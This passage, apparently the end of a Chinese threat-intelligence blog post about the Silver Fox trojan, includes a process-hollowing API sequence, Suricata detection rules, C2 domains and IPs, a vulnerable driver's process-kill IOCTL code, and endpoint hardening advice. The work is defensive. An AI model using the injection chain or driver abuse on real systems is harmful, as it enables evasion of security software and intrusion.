+<td>删除关键文件、擦除日志、破坏MBR</td>
+<td>攻击痕迹销毁与破坏</td>
+</tr>
+<tr>
+<td>远程桌面</td>
+<td>通过管控终端或AnyDesk接管桌面</td>
+<td>完整可视化控制</td>
+</tr>
+</tbody>
+</table>
+<h3>11.5 进程注入技术</h3>
+<p>银狐木马采用经典的Process Hollowing（进程镂空）链进行进程注入：</p>
+<ol>
+<li>以挂起状态创建一个合法系统进程（如<code>svchost.exe</code>）</li>
+<li><code>ZwUnmapViewOfSection</code>卸载原进程内存映像</li>
+<li><code>VirtualAllocEx</code>在目标进程中分配内存</li>
+<li><code>WriteProcessMemory</code>写入恶意PE映像</li>
+<li><code>SetThreadContext</code>修改入口点指向恶意代码</li>
+<li><code>ResumeThread</code>恢复线程执行，恶意代码在合法进程上下文中运行</li>
+</ol>
+<p>该技术在进程列表中显示为合法系统进程，且数字签名信息完好，极大增加了检测难度。</p>
+<hr />
+<h2>十二、检测规则与IoC指标</h2>
+<h3>12.1 Suricata检测规则</h3>
+<p>以下Suricata规则覆盖银狐木马本轮攻击的关键网络行为特征：</p>
+<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="o">============================================================</span>
+<span class="err">#</span><span class="w"> </span><span class="nx">银狐木马</span><span class="w"> </span><span class="nx">Suricata</span><span class="w"> </span><span class="nx">检测规则集</span>
+<span class="err">#</span><span class="w"> </span><span class="nx">覆盖</span><span class="p">:</span><span class="w"> </span><span class="nx">DoH隧道检测</span><span class="err">、</span><span class="nx">AtlasCross</span><span class="w"> </span><span class="nx">C2握手</span><span class="err">、</span><span class="nx">TCP自定义协议</span>
+<span class="err">#</span><span class="w"> </span><span class="o">============================================================</span>
+
+<span class="err">#</span><span class="w"> </span><span class="nx">规则1</span><span class="p">:</span><span class="w"> </span><span class="nx">DoH隧道C2域名检测</span>
+<span class="err">#</span><span class="w"> </span><span class="nx">检测通过DoH协议查询银狐C2域名的行为</span>
+<span class="nx">alert</span><span class="w"> </span><span class="nx">tls</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="p">[</span><span class="m m-Double">223.5.5.5</span><span class="p">,</span><span class="m m-Double">223.6.6.6</span><span class="p">,</span><span class="m m-Double">8.8.8.8</span><span class="p">,</span><span class="m m-Double">8.8.4.4</span><span class="p">]</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="nx">msg</span><span class="p">:</span><span class="s">&quot;银狐木马 DoH隧道C2域名查询 - oidng2.duoshit.com&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">flow</span><span class="p">:</span><span class="nx">established</span><span class="p">,</span><span class="nx">to_server</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">tls</span><span class="p">.</span><span class="nx">sni</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;dns-query&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">request_body</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;|00 00 01 00 00 01|&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">pcre</span><span class="p">:</span><span class="s">&quot;/oidng2|duoshit/&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">reference</span><span class="p">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">blog</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">example</span><span class="o">/</span><span class="nx">silverfox</span><span class="o">-</span><span class="nx">doh</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">classtype</span><span class="p">:</span><span class="nx">trojan</span><span class="o">-</span><span class="nx">activity</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">sid</span><span class="p">:</span><span class="mi">20260001</span><span class="p">;</span><span class="w"> </span><span class="nx">rev</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">)</span>
+
+<span class="err">#</span><span class="w"> </span><span class="nx">规则2</span><span class="p">:</span><span class="w"> </span><span class="nx">DoH隧道流量检测</span><span class="err">（</span><span class="nx">通用</span><span class="err">）</span>
+<span class="err">#</span><span class="w"> </span><span class="nx">检测到已知DoH服务器的POST</span><span class="w"> </span><span class="o">/</span><span class="nx">dns</span><span class="o">-</span><span class="nx">query请求</span>
+<span class="err">#</span><span class="w"> </span><span class="nx">配合DNS</span><span class="w"> </span><span class="nx">wire</span><span class="w"> </span><span class="nx">format载荷特征进行检测</span>
+<span class="nx">alert</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="p">[</span><span class="m m-Double">223.5.5.5</span><span class="p">,</span><span class="m m-Double">8.8.8.8</span><span class="p">]</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="nx">msg</span><span class="p">:</span><span class="s">&quot;银狐木马 DoH隧道通信 - 可疑DNS-over-HTTPS查询&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">flow</span><span class="p">:</span><span class="nx">established</span><span class="p">,</span><span class="nx">to_server</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">method</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;POST&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">uri</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;/dns-query&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">request_header</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;application/dns-message&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">request_body</span><span class="p">;</span><span class="w"> </span><span class="nx">depth</span><span class="p">:</span><span class="mi">12</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;|00 01 00 00 00 01 00 00 00 00 00 00|&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">classtype</span><span class="p">:</span><span class="nx">trojan</span><span class="o">-</span><span class="nx">activity</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">sid</span><span class="p">:</span><span class="mi">20260002</span><span class="p">;</span><span class="w"> </span><span class="nx">rev</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">)</span>
+
+<span class="err">#</span><span class="w"> </span><span class="nx">规则3</span><span class="p">:</span><span class="w"> </span><span class="nx">AtlasCross</span><span class="w"> </span><span class="nx">C2握手Beacon检测</span>
+<span class="err">#</span><span class="w"> </span><span class="nx">检测AtlasCross变种的握手特征字节序列</span>
+<span class="nx">alert</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="nx">msg</span><span class="p">:</span><span class="s">&quot;银狐木马 AtlasCross C2握手Beacon检测&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">flow</span><span class="p">:</span><span class="nx">established</span><span class="p">,</span><span class="nx">to_server</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;|53 46 75 63 6b 00 00 00|&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">depth</span><span class="p">:</span><span class="mi">8</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">reference</span><span class="p">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">blog</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">example</span><span class="o">/</span><span class="nx">silverfox</span><span class="o">-</span><span class="nx">atlascross</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">classtype</span><span class="p">:</span><span class="nx">trojan</span><span class="o">-</span><span class="nx">activity</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">sid</span><span class="p">:</span><span class="mi">20260003</span><span class="p">;</span><span class="w"> </span><span class="nx">rev</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">)</span>
+
+<span class="err">#</span><span class="w"> </span><span class="nx">规则4</span><span class="p">:</span><span class="w"> </span><span class="nx">TCP自定义协议C2通信检测</span>
+<span class="err">#</span><span class="w"> </span><span class="nx">检测银狐TCP自定义协议的特征端口和协议结构</span>
+<span class="nx">alert</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="p">[</span><span class="m m-Double">8.218.106.149</span><span class="p">,</span><span class="m m-Double">156.251.16.226</span><span class="p">]</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="nx">msg</span><span class="p">:</span><span class="s">&quot;银狐木马 TCP自定义协议C2通信&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">flow</span><span class="p">:</span><span class="nx">established</span><span class="p">,</span><span class="nx">to_server</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">dsize</span><span class="p">:&gt;</span><span class="mi">10</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">classtype</span><span class="p">:</span><span class="nx">trojan</span><span class="o">-</span><span class="nx">activity</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">sid</span><span class="p">:</span><span class="mi">20260004</span><span class="p">;</span><span class="w"> </span><span class="nx">rev</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">)</span>
+
+<span class="err">#</span><span class="w"> </span><span class="nx">规则5</span><span class="p">:</span><span class="w"> </span><span class="nx">C2端口7000连接检测</span>
+<span class="nx">alert</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="err">$</span><span class="nx">HOME_NET</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">$</span><span class="nx">EXTERNAL_NET</span><span class="w"> </span><span class="mi">7000</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="nx">msg</span><span class="p">:</span><span class="s">&quot;银狐木马 C2端口连接 - 7000端口&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">flow</span><span class="p">:</span><span class="nx">established</span><span class="p">,</span><span class="nx">to_server</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">classtype</span><span class="p">:</span><span class="nx">trojan</span><span class="o">-</span><span class="nx">activity</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">sid</span><span class="p">:</span><span class="mi">20260005</span><span class="p">;</span><span class="w"> </span><span class="nx">rev</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">)</span>
+
+<span class="err">#</span><span class="w"> </span><span class="nx">规则6</span><span class="p">:</span><span class="w"> </span><span class="nx">银狐C2</span><span class="w"> </span><span class="nx">IP直连检测</span>
+<span class="nx">alert</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="err">$</span><span class="nx">HOME_NET</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="p">[</span><span class="m m-Double">8.218.106.149</span><span class="p">,</span><span class="m m-Double">156.251.16.226</span><span class="p">]</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="nx">msg</span><span class="p">:</span><span class="s">&quot;银狐木马 C2 IP直连通信&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">classtype</span><span class="p">:</span><span class="nx">trojan</span><span class="o">-</span><span class="nx">activity</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">sid</span><span class="p">:</span><span class="mi">20260006</span><span class="p">;</span><span class="w"> </span><span class="nx">rev</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">)</span>
+</code></pre></div>
+
+<h3>12.2 网络行为检测清单</h3>
+<p>除Suricata规则外，以下网络行为检测清单可用于SIEM/EDR的关联分析：</p>
+<table>
+<thead>
+<tr>
+<th>检测项</th>
+<th>检测逻辑</th>
+<th>风险等级</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DoH异常查询</td>
+<td>非浏览器进程向223.5.5.5/8.8.8.8发送/dns-query POST请求</td>
+<td>高</td>
+</tr>
+<tr>
+<td>非标端口外联</td>
+<td>内网终端连接外部7000端口TCP连接</td>
+<td>高</td>
+</tr>
+<tr>
+<td>C2域名解析</td>
+<td>DNS查询oidng2.duoshit.com或duoshit.com子域名</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>C2 IP直连</td>
+<td>内网终端直连8.218.106.149或156.251.16.226</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>大体积PE下载</td>
+<td>从OSS域名下载超过50MB的PE文件</td>
+<td>中</td>
+</tr>
+<tr>
+<td>异常TLS握手</td>
+<td>TLS Client Hello中SNI为dns-query的异常连接</td>
+<td>高</td>
+</tr>
+<tr>
+<td>管控终端异常IP</td>
+<td>管控系统上线配置中出现非企业内网的IP地址</td>
+<td>严重</td>
+</tr>
+<tr>
+<td>AnyDesk静默安装</td>
+<td>AnyDesk安装过程无用户交互且随后修改配置文件</td>
+<td>高</td>
+</tr>
+</tbody>
+</table>
+<h3>12.3 IoC指标表</h3>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>指标值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>文件Hash (MD5)</td>
+<td><code>8c4fc902905459a53f686372a1a85526</code></td>
+<td>DoH变种主样本（雷电模拟器伪装）</td>
+</tr>
+<tr>
+<td>C2域名</td>
+<td><code>oidng2.duoshit.com</code></td>
+<td>主C2域名（经DoH解析）</td>
+</tr>
+<tr>
+<td>C2域名</td>
+<td><code>duoshit.com</code></td>
+<td>C2域名根域</td>
+</tr>
+<tr>
+<td>C2 IP</td>
+<td><code>8.218.106.149:7000</code></td>
+<td>TCP自定义协议C2服务器</td>
+</tr>
+<tr>
+<td>C2 IP</td>
+<td><code>156.251.16.226</code></td>
+<td>管控终端滥用上线IP</td>
+</tr>
+<tr>
+<td>DoH服务器</td>
+<td><code>223.5.5.5</code></td>
+<td>AliDNS DoH服务器</td>
+</tr>
+<tr>
+<td>DoH服务器</td>
+<td><code>223.6.6.6</code></td>
+<td>AliDNS备用DoH服务器</td>
+</tr>
+<tr>
+<td>DoH服务器</td>
+<td><code>8.8.8.8</code></td>
+<td>Google DNS DoH服务器</td>
+</tr>
+<tr>
+<td>驱动文件</td>
+<td><code>TrueSight.sys</code></td>
+<td>BYOVD漏洞驱动</td>
+</tr>
+<tr>
+<td>IOCTL码</td>
+<td><code>0x22e044</code></td>
+<td>TrueSight驱动进程终止IOCTL</td>
+</tr>
+<tr>
+<td>握手Beacon</td>
+<td><code>53 46 75 63 6b 00 00 00</code></td>
+<td>AtlasCross变种C2握手特征</td>
+</tr>
+<tr>
+<td>管控终端IP</td>
+<td><code>156.251.16.226</code></td>
+<td>管控系统注册表写入的上线IP</td>
+</tr>
+<tr>
+<td>Telegram路径</td>
+<td><code>%s\Telegram Desktop\tdata</code></td>
+<td>凭据窃取硬编码路径</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>十三、终端防护策略</h2>
+<h3>13.1 驱动加载防护</h3>
+<p>针对BYOVD攻击，建议采取以下多层防护措施：</p>
+<ol>
+<li>
+<p><strong>启用易受攻击驱动程序黑名单</strong>：确保Windows 11 22H2及以上版本的"易受攻击的驱动程序黑名单"功能处于启用状态（默认启用，但部分企业镜像可能关闭）。该机制可阻止TrueSight.sys等已知漏洞驱动的加载。</p>
+</li>
+<li>
+<p><strong>部署WDAC策略</strong>：通过Windows Defender Application Control部署驱动白名单策略，仅允许经企业审批的内核驱动加载。WDAC策略从内核层面拦截非白名单驱动的加载，即使驱动具有合法签名也会被阻止。</p>
+</li>
+<li>
+<p><strong>监控驱动加载行为</strong>：EDR产品应注册<code>PsSetLoadImageNotifyRoutine</code>内核回调，监控所有驱动加载事件。重点关注以下异常模式：临时目录释放sys文件后立即通过SCM加载、非系统目录加载驱动、已知漏洞驱动文件名出现等。</p>
+</li>
+</ol>
+<h3>13.2 DoH隧道检测与阻断</h3>
+<ol>
+<li>
+<p><strong>DoH流量识别</strong>：在企业网络出口部署支持DoH流量识别的NGFW或IDS设备。检测特征包括：目标IP为已知DoH服务器（223.5.5.5、8.8.8.8等）、HTTP路径包含<code>/dns-query</code>、Content-Type为<code>application/dns-message</code>。</p>
+</li>
+<li>
+<p><strong>非浏览器进程DoH检测</strong>：在终端层面监控非浏览器进程发起的DoH请求。正常情况下仅浏览器和少数系统组件使用DoH，任何其他进程发起DoH请求均应视为高可疑行为。</p>
+</li>
+<li>
+<p><strong>DNS策略管控</strong>：在网络层面将终端DNS查询强制重定向至企业内部DNS服务器，阻断终端直接使用外部DoH服务器的能力。对于必须使用DoH的场景，仅允许指定的企业管控DoH服务器。</p>
+</li>
+</ol>
+<h3>13.3 管控终端安全加固</h3>
+<p>针对管控终端滥用这一新攻击面，建议采取以下措施：</p>
+<ol>
+<li>
+<p><strong>最小权限原则</strong>：审查管控系统的功能权限配置，关闭非必要的远程功能（如自定义脚本执行、远程关机）。对必须保留的高风险功能（远程桌面接管）启用强制的二次认证（非简单验证码，应使用基于硬件令牌或生物特征的MFA）。</p>
+</li>
+<li>
+<p><strong>上线IP白名单</strong>：管控系统的上线配置应绑定企业内网IP段，通过注册表监控检测上线IP被篡改为外部IP的行为。</p>
+</li>
+<li>
+<p><strong>操作审计</strong>：开启管控系统的全量操作审计日志，将远程桌面接管、文件传输、脚本执行等高风险操作日志接入SIEM平台进行实时关联分析。</p>
+</li>
+<li>
+<p><strong>AnyDesk管控</strong>：通过应用控制策略禁止AnyDesk等第三方远控工具的安装和运行。如业务必须使用，应通过企业统一管理的远控平台替代，并实施严格的访问控制。</p>
+</li>
+</ol>
+<h3>13.4 持久化检测</h3>
+<ol>
+<li>
+<p><strong>计划任务基线监控</strong>：定期扫描系统计划任务，与基线进行比对，重点关注以SYSTEM权限运行、触发频率为每分钟、名称伪装为系统更新的异常任务。</p>
+</li>
+<li>
+<p><strong>Phantom Persistence检测</strong>：监控<code>RegisterApplicationRestart</code>和<code>SetProcessShutdownParameters</code>API的调用行为，对非系统进程注册应用程序重启回调的行为进行告警。</p>
+</li>
+<li>
+<p><strong>GAC目录监控</strong>：监控.NET GAC目录的文件写入行为，任何新增DLL都应进行签名验证和人工审查。</p>
+</li>
+<li>
+<p><strong>进程注入检测</strong>：EDR产品应监控<code>CreateRemoteThread</code>、<code>WriteProcessMemory</code>、<code>ZwUnmapViewOfSection</code>等进程注入相关API的调用，对Process Hollowing特征行为链进行告警。</p>
+</li>
+</ol>
+<h3>13.5 综合防御体系建议</h3>
+<p>银狐木马的攻击链路长、技术手段多、变种更新快，单一防护手段难以全面覆盖。建议企业构建以下纵深防御体系：</p>
+<ol>
+<li>
+<p><strong>入口管控</strong>：邮件网关部署银狐样本特征检测规则，拦截伪装为安装包的恶意附件；Web下载渠道部署文件类型和签名验证，拦截未签名或被盗签名的大体积PE文件。</p>
+</li>
+<li>
+<p><strong>行为检测</strong>：EDR终端部署基于行为链的检测规则，将"临时目录释放驱动文件→SCM加载驱动→安全软件进程批量终止"这一BYOVD行为链作为高危告警关联规则。</p>
+</li>
+<li>
+<p><strong>网络监控</strong>：网络层部署DoH检测规则和C2 IP/域名黑名单，阻断已知的C2通信通道。</p>
+</li>
+<li>
+<p><strong>应急响应</strong>：建立银狐木马专项应急响应SOP，包含IoC快速扫描脚本、持久化排查清单、管控终端审计流程等，确保在发现感染后能够快速定位和清除。</p>
+</li>
+<li>
+<p><strong>威胁情报订阅</strong>：订阅银狐木马专项威胁情报 feed，及时获取新增变种IoC和TTPs更新，保持检测规则的时效性。</p>
+</li>
+</ol>
+<hr />
+<h2>十四、总结</h2>
+<p>银狐木马本轮攻击展示了该家族在攻击工程化方面的持续进化。从技术层面看，三大创新值得关注：DoH隐蔽隧道使C2通信的检测难度显著提升；BYOVD内核态进程终止使传统安全软件的自身保护机制面临严峻挑战；管控终端与合法远控工具的滥用则开辟了利用企业合法基础设施进行隐蔽控制的新攻击面。</p>
+<p>对于威胁情报分析师而言，关注重点应放在核心控制层和功能插件层的稳定特征上——C2通信协议结构、握手Beacon特征、BYOVD驱动IOCTL码、212个安全软件进程名列表等，这些特征在加载器层频繁更换的情况下保持相对稳定，是建立有效检测规则的关键锚点。</p>
+<p>对于终端安全工程师而言，防护策略需要从"签名检测"向"行为链检测"转型。银狐木马的大体积膨胀、VMProtect虚拟化、被盗EV签名等手段使得传统的基于文件特征的检测日益失效。基于行为链的检测——即关联多个低风险行为形成高风险判定——是应对此类威胁的有效方向。同时，管控终端和合法远控工具的滥用提醒我们，安全防御的视野不能仅限于"检测恶意软件"，还需要审视企业自身IT基础设施中被武器化的风险。</p>
+<p>银狐木马的演化不会停止。可以预见，未来变种将进一步探索更隐蔽的C2通信方式（如域名前置、合法云服务滥用）、更强大的反分析技术（如AI辅助的代码混淆）、以及更广泛的合法工具武器化。安全社区需要保持持续的技术跟踪和信息共享，才能在这场攻防博弈中保持有效防御。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
